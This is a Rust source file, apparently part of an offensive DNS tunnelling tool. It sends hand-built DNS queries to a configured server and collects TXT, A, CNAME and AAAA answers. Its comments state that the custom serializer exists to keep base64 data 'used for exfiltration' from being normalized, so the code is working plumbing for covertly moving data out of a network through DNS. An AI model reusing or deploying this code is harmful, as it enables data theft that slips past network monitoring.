use rustdns::{Message,Question};
use rustdns::types::*;
use std::net::UdpSocket;
use std::time::Duration;
use std::io;
use std::collections::HashMap;
use once_cell::sync::Lazy;
use crate::DNS_SERVER;


static DNS_QUERY_TYPE: Lazy<HashMap<&'static str, rustdns::types::Type>> = Lazy::new(|| {
    HashMap::from([
        ("a_record", Type::A),
        ("aaaa_record", Type::AAAA),
        ("cname_record", Type::CNAME),
    ])
});


pub fn dns_request(query: &str, dns_type: &str) -> Vec<String> {

    //Define remote DNS server and domain that will be queried
    let remote_server: &str = DNS_SERVER;

    //Construct the DNS message
    let mut msg: Message = Message::default();

    // Construct the DNS question,
    // doing this manually to avoid normalization which will break the base64 part
    let q = Question {
        name: query.to_string(),
        r#type: *DNS_QUERY_TYPE.get(dns_type).unwrap(),
        class: Class::Internet
    };

    msg.questions.push(q);

    msg.add_extension(Extension {
        payload_size: 4096,
        ..Default::default()
    });

    // Prepare the UDP socket and send the dns req
    let sock = UdpSocket::bind("0.0.0.0:0").expect("[!] Cant bind udp socket");
    sock.set_read_timeout(Some(Duration::from_millis(2000))).expect("[!] Couldnt set read timeout to socket");

    sock.connect(remote_server).expect("[!] Cant connect to DNS host");
 
    // Use a custom to_vec function to again avoid normalization
    let question = custom_message_to_vec(&msg).unwrap();
    sock.send(&question).expect("[!] Cant send dns query");


    // Attempt to receive the response and parse it
    let mut response = [0; 4096];
    let len = match sock.recv(&mut response) {
        Ok(data) => data,
        Err(_e) => {
            return Vec::new();
        }
    };

    let message = match Message::from_slice(&response[0..len]) {
        Ok(data) => data,
        Err(e) => {
            println!("[!] Error: {}", e);
            return Default::default();
        }
    };

    // Get the query answer
    let mut query_answer: Vec<String> = Vec::new();
    for answer in message.answers {

        match answer.resource {
            Resource::TXT(txt_data) => {
                let msg = String::from_utf8_lossy(&txt_data.0[0]);
                query_answer.push(msg.to_string());
            },
            Resource::A(record) => {
                query_answer.push(record.to_string());
            },
            Resource::CNAME(record) => {
                query_answer.push(record.to_string());
            },
            Resource::AAAA(record) => {
                query_answer.push(record.to_string());
            },
            _ => {
                return query_answer;
            }
        };
    };
    return query_answer;
}


// Custom implementation for Message.to_vec() to avoid the domain name normalization,
// this is needed so the base64 part used for exfiltration is not malformed
pub fn custom_message_to_vec(msg: &Message) -> io::Result<Vec<u8>> {
    let mut req = Vec::<u8>::with_capacity(512);
    
    // Write the message ID as a Big endian byte array
    req.extend_from_slice(&(msg.id as u16).to_be_bytes());

    //DNS specific flags
    // Write the flags
    let mut b = 0_u8;
    b |= if msg.qr.to_bool() { 0b1000_0000 } else { 0 };
    b |= ((msg.opcode as u8) << 3) & 0b0111_1000;
    b |= if msg.aa { 0b0000_0100 } else { 0 };
    b |= if msg.tc { 0b0000_0010 } else { 0 };
    b |= if msg.rd { 0b0000_0001 } else { 0 };
    req.push(b);

    // Write the flags (continued)
    let mut b = 0_u8;
    b |= if msg.ra { 0b1000_0000 } else { 0 };
    b |= if msg.z { 0b0100_0000 } else { 0 };
    b |= if msg.ad { 0b0010_0000 } else { 0 };
    b |= if msg.cd { 0b0001_0000 } else { 0 };
    b |= (msg.rcode as u8) & 0b0000_1111;
    req.push(b);

    // Write counts of questions, answers, authorities, and additional records
    req.extend_from_slice(&(msg.questions.len() as u16).to_be_bytes());
    req.extend_from_slice(&(msg.answers.len() as u16).to_be_bytes());
    req.extend_from_slice(&(msg.authoritys.len() as u16).to_be_bytes());
    req.extend_from_slice(&(msg.additionals.len() as u16).to_be_bytes());

    // Write questions
    for question in &msg.questions {
        let full_domain = &question.name;

        // Prepare the DNS labels so they can be written to the req vector
        for label in full_domain.split('.') {
            // Skip empty labels
            if label.is_empty() {
                continue; 
            }
            let label_bytes = label.as_bytes();

            // Write the length byte
            req.push(label_bytes.len() as u8);
            // Write the label bytes
            req.extend_from_slice(label_bytes);
        }
        // Ensure to terminate the domain with a zero byte
        req.push(0);

        // Write the question type and class
        req.extend_from_slice(&(question.r#type as u16).to_be_bytes());
        req.extend_from_slice(&(question.class as u16).to_be_bytes());
    }

    Ok(req)
}